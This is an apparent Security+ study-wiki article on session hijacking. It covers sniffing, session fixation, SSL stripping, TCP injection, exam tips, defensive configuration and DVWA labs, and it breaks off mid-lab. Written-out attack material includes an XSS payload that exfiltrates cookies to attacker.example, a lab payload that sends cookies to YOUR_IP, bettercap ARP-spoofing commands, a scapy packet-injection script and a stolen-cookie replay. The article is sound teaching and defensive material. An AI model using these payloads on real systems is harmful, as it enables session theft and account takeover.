---
domain: "attack-techniques"
tags: [session-hijacking, web-security, authentication, network-attacks, cookies, mitm]
---
# Session Hijacking

**Session hijacking** is an attack where an adversary takes over a legitimate user's authenticated [[Session Management|session]] by stealing or forging the **session token** used to identify that user to a server. Because most web applications and network protocols rely on session identifiers to maintain state after authentication, a stolen token grants the attacker the same privileges as the victim without requiring their credentials. It is closely related to [[Man-in-the-Middle Attack|man-in-the-middle attacks]], [[Cross-Site Scripting (XSS)]], and [[Cookie Theft]].

---

## Overview

Session hijacking exploits the fundamental design of stateless protocols such as HTTP. Because HTTP carries no inherent memory of prior requests, web applications invented the concept of a session: after a user authenticates, the server generates a unique token and sends it to the client (typically as a cookie, URL parameter, or hidden form field). Every subsequent request includes that token so the server can recognize the user without re-authenticating them. If an attacker obtains that token, they can impersonate the user for the duration of the session.

The attack exists because session tokens are transmitted over networks, stored in browsers, and occasionally embedded in URLs — all locations where they can be intercepted, stolen by malicious scripts, or predicted if generated with weak randomness. Early web frameworks frequently generated sequential or time-based session IDs that were trivially predictable. Modern frameworks use cryptographically random 128-bit or larger identifiers, but the transmission and storage problems remain if the application is misconfigured.

Session hijacking has been a documented attack vector since the early days of the internet. The `nmap` author Fyodor and tools like `hunt` and `juggernaut` demonstrated TCP session hijacking in the late 1990s. The 2010 release of the **Firesheep** Firefox extension made the attack dramatically accessible to non-technical users by automating cookie theft over unencrypted Wi-Fi, capturing sessions on Facebook, Twitter, and Amazon simply by sniffing 802.11 broadcast traffic. This single event is widely credited with accelerating the industry-wide adoption of HTTPS.

Session hijacking is not limited to web applications. **TCP session hijacking** targets the underlying transport layer itself, exploiting the predictability of TCP sequence numbers to inject packets into an existing TCP stream. This is more complex in modern networks due to randomized initial sequence numbers (ISN) mandated by RFC 6528, but remains a concern on trusted internal networks or against poorly configured services.

In enterprise environments, session hijacking frequently targets Single Sign-On (SSO) tokens, OAuth access tokens, JSON Web Tokens (JWTs), and Kerberos tickets (the latter known as [[Pass-the-Ticket]]). A single stolen SSO token can give an attacker access to dozens of connected applications simultaneously, making the impact of a single hijack far greater than in the era of per-application login systems.

---

## How It Works

### Phase 1 — Token Acquisition

The attacker must first obtain a valid session token. The primary methods are:

**1. Passive Network Sniffing (Sidejacking)**
On unencrypted HTTP connections, session cookies are transmitted in plaintext in the `Cookie:` HTTP header. An attacker on the same network segment uses a packet capture tool to extract them.

```bash
# Capture HTTP traffic and extract Set-Cookie headers with tcpdump
tcpdump -i eth0 -A -s 0 'tcp port 80' | grep -i 'set-cookie\|cookie:'

# Alternatively with Wireshark display filter:
# http.cookie or http.set_cookie
```

**2. Cross-Site Scripting (XSS)**
If an application reflects unsanitized input, an attacker injects JavaScript that reads the document cookie and exfiltrates it to an attacker-controlled server:

```javascript
// Injected XSS payload — exfiltrates session cookie
<script>
  new Image().src = "https://attacker.example/steal?c=" + document.cookie;
</script>
```

The `HttpOnly` flag on cookies blocks JavaScript access via `document.cookie`, which is why its absence is a critical misconfiguration.

**3. Man-in-the-Middle (SSL Stripping)**
Using tools like `sslstrip` or `bettercap`, an attacker on a local network downgrades HTTPS connections to HTTP, then sniffs the plaintext traffic including cookies:

```bash
# bettercap ARP poisoning + SSL stripping
sudo bettercap -iface eth0
# Inside bettercap:
set arp.spoof.targets 192.168.1.50
arp.spoof on
set net.sniff.filter tcp port 80 or port 443
net.sniff on
```

**4. Session Fixation**
Rather than stealing an existing token, the attacker forces the victim to use a known token. The attacker obtains a pre-authentication session ID from the server, then tricks the victim into authenticating while using that ID (e.g., via a crafted URL: `https://bank.example/login?sessionid=ATTACKER_KNOWN_ID`). After the victim logs in, the server has bound the known session ID to an authenticated session.

**5. TCP Session Hijacking**
At the network layer, an attacker who can observe traffic between client and server can predict or calculate the next expected TCP sequence number and inject a forged packet that appears to come from the legitimate client:

```
Client  <---[SYN/ACK SEQ=X ACK=Y]---  Server
Attacker observes SEQ numbers
Attacker sends forged packet:
  SRC=Client_IP, DST=Server_IP, SEQ=Y, ACK=X+1, DATA=malicious_command
```

Tools like `scapy` can construct such packets in a lab environment:

```python
from scapy.all import *

# Craft a forged TCP packet injecting data into an existing stream
pkt = IP(src="192.168.1.10", dst="192.168.1.1") / \
      TCP(sport=54321, dport=23, seq=100200, ack=200100, flags="PA") / \
      Raw(load="injected command\n")
send(pkt)
```

### Phase 2 — Token Replay

Once the attacker has the token, they replay it in their own requests:

```bash
# curl replaying a stolen session cookie
curl -b "PHPSESSID=abc123def456stolen" https://target.example/account/dashboard

# In Burp Suite: paste cookie into Repeater tab, forward request
```

### Phase 3 — Session Maintenance

If the original victim logs out or the server detects anomalous activity (e.g., IP change, user-agent change), the session may be invalidated. Attackers often work quickly or attempt to prevent the victim from logging out (e.g., keeping the victim session alive via automated keep-alive requests).

---

## Key Concepts

- **Session Token**: A unique, randomly generated identifier (typically 128+ bits of entropy) assigned by a server after successful authentication. It is the primary target of session hijacking because possession equals identity.
- **Cookie Flags — HttpOnly**: A flag applied to HTTP cookies (`Set-Cookie: id=abc; HttpOnly`) that prevents client-side JavaScript from reading the cookie value, blocking XSS-based theft via `document.cookie`.
- **Cookie Flags — Secure**: A flag (`Set-Cookie: id=abc; Secure`) that instructs the browser to only transmit the cookie over HTTPS connections, preventing exposure over plaintext HTTP.
- **Session Fixation**: A variant attack where the attacker *supplies* a session ID to the victim before authentication, rather than stealing one after — the server must regenerate a new session ID upon successful login to prevent this.
- **Sidejacking**: The specific technique of capturing session cookies from unencrypted wireless traffic, popularized by the Firesheep tool in 2010; it targets the session cookie rather than the authentication credentials.
- **TCP Sequence Number Prediction**: A prerequisite for TCP-layer session hijacking; modern OS kernels use cryptographically random ISNs (RFC 6528) to make this attack impractical on the open internet, though it remains a risk on controlled internal networks.
- **Token Entropy**: The measure of randomness in a session ID; IDs with low entropy (e.g., sequential integers, timestamps) are vulnerable to **session prediction** attacks where the attacker brute-forces or calculates valid session IDs.
- **SameSite Cookie Attribute**: A newer attribute (`SameSite=Strict` or `Lax`) that restricts cookies from being sent in cross-origin requests, mitigating [[Cross-Site Request Forgery (CSRF)]] and reducing the attack surface for certain hijacking scenarios.

---

## Exam Relevance

**SY0-701 Objective Mapping**: Session hijacking primarily maps to **Domain 2.0 — Threats, Vulnerabilities, and Mitigations** and **Domain 4.0 — Security Operations** (specifically authentication and session security controls).

**Common Question Patterns:**

- Questions often describe a scenario where an attacker "intercepts a cookie" or "captures network traffic on a public Wi-Fi" and ask what attack is occurring — the answer is session hijacking or sidejacking specifically.
- Distinguish **session hijacking** (stealing an existing authenticated session token) from **session fixation** (forcing the victim to use a predetermined token) — the exam tests this distinction.
- Know that **HttpOnly** prevents XSS-based cookie theft and **Secure** prevents transmission over HTTP — questions may ask which flag addresses which threat.
- **SSL stripping** is a precursor technique that enables session hijacking over networks that should be encrypted — distinguish from a standard MitM or eavesdropping scenario.
- The correct defense against TCP session hijacking at the network layer is **encryption (TLS/IPSec)** not just sequence number randomization.

**Gotchas:**

- Do not confuse **session hijacking** with **credential theft** — the attacker does *not* know the user's password, only the session token. This means the victim's password is unchanged and a password reset alone does not remediate an active hijack.
- The exam may use the term **cookie poisoning** — this refers to modifying cookie values (privilege escalation), not necessarily stealing them; it is related but distinct.
- **Replay attacks** are a broader category; session hijacking is a specific form of token replay targeting authenticated web/network sessions.

---

## Security Implications

### Vulnerabilities and Attack Vectors

**CVE-2011-2107 (Adobe Flash Cookie Theft)**: Adobe Flash's `LocalConnection` feature allowed cross-domain cookie access, enabling session token exfiltration. Patched in Flash Player 10.3.

**Firesheep (2010)**: Not a CVE but a watershed security event. Eric Butler's Firefox extension demonstrated automated sidejacking against major websites. Facebook, Twitter, Flickr, and Amazon were all vulnerable due to transmitting session cookies over HTTP after initial HTTPS login. This incident drove near-universal adoption of HTTPS-everywhere policies.

**JWT Algorithm Confusion (CVE-2022-21449 / broader class)**: JSON Web Tokens signed with weak algorithms (e.g., `alg: none` attacks or RS256→HS256 confusion) allow attackers to forge tokens entirely, achieving session hijacking without ever capturing a legitimate token.

**Heartbleed (CVE-2014-0160)**: The OpenSSL vulnerability allowed attackers to read server memory, which could contain active session tokens from currently authenticated users — a server-side session token theft rather than a network-based one.

### Detection Indicators

- Sudden IP address changes mid-session (geographically impossible transitions)
- User-agent string mismatch between requests in the same session
- Multiple simultaneous logins with the same session token from different source IPs
- Session activity during hours inconsistent with the user's normal patterns (detectable via UEBA)
- HTTP requests to `/account/settings`, `/admin`, or data-export endpoints immediately following a session start (attackers move quickly after hijacking)

---

## Defensive Measures

### Cookie Security Configuration

Ensure all session cookies are issued with appropriate flags. In Apache:

```apache
# Apache - set cookie security headers globally
Header always edit Set-Cookie ^(.*)$ "$1; HttpOnly; Secure; SameSite=Strict"
```

In NGINX:

```nginx
# NGINX - proxy_cookie_flags directive (NGINX 1.19.3+)
proxy_cookie_flags ~ HttpOnly Secure SameSite=Strict;
```

In application code (Python/Flask example):

```python
app.config.update(
    SESSION_COOKIE_HTTPONLY=True,
    SESSION_COOKIE_SECURE=True,
    SESSION_COOKIE_SAMESITE='Strict',
    PERMANENT_SESSION_LIFETIME=timedelta(minutes=30)
)
```

### Session Management Best Practices

- **Regenerate session IDs after login**: Destroys any pre-authentication session ID, defeating session fixation. In PHP: `session_regenerate_id(true)` immediately after `$_SESSION['authenticated'] = true`.
- **Implement absolute and idle timeouts**: Limit session lifetime to 15–30 minutes of inactivity and an absolute maximum (e.g., 8 hours), reducing the window for token replay.
- **Bind sessions to client attributes**: Optionally bind sessions to the client IP and/or User-Agent string; flag anomalous changes for re-authentication (balance security with usability for mobile/VPN users).
- **Short-lived tokens with refresh**: OAuth 2.0 access tokens should have short lifespans (5–15 minutes) with secure refresh token rotation, limiting the damage of a stolen access token.

### Network Layer Defenses

- **Enforce HTTPS with HSTS**: Implement HTTP Strict Transport Security to prevent SSL stripping:
  ```
  Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
  ```
- **Certificate Pinning**: Mobile applications should pin the server certificate to prevent MitM-based interception.
- **Network Segmentation and Encryption**: Deploy [[IPSec]] or [[WireGuard]] on internal networks to encrypt traffic even between trusted hosts, preventing TCP-layer sniffing.

### Detection and Response

- Deploy a **WAF** (e.g., ModSecurity, AWS WAF) with rules detecting anomalous session behavior.
- Enable **SIEM correlation rules** for impossible travel (same session token used from two geographically distant IPs within minutes).
- Implement **server-side session invalidation** endpoints and ensure logout truly destroys the server-side session record, not just deletes the client cookie.
- Use **Content Security Policy (CSP)** headers to mitigate the XSS vectors that enable cookie theft:
  ```
  Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';
  ```

---

## Lab / Hands-On

### Lab 1 — Cookie Theft via XSS (DVWA)

Deploy DVWA (Damn Vulnerable Web Application) in Docker:

```bash
docker run --rm -it -p 80:80 vulnerables/web-dvwa
```

1. Navigate to `http://localhost/dvwa` and log in (admin/password).
2. Set DVWA security level to **Low**.
3. Go to **XSS (Reflected)**, enter the following payload:
   ```html
   <script>alert(document.cookie)</script>
   ```
4. Observe the session cookie displayed in the alert box.
5. Set up a listener to capture exfiltrated cookies:
   ```bash
   # Simple Python HTTP listener
   python3 -m http.server 8888
   ```
6. Use payload: `<script>fetch('http://YOUR_IP:8888/?c='+document.cookie)</script>`
7. Observe the cookie arriving in your listener's access log.

### Lab 2 — Sidejacking with Wireshark

On a VM running an HTTP-only application:

```bash
# Start a simple HTTP server with session simulation
python3 -c "
import http.server, socketserver
class Handler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Set-Cookie', 'session=SECRETTOKEN123; Path=/')
        self.end_headers()
        self.wfile.write(b'Logged in!')
socketserver.TCPServer(('', 8080), Handler).serve_forever()
"
```

Capture in Wireshark using filter `http` and observe the `Set-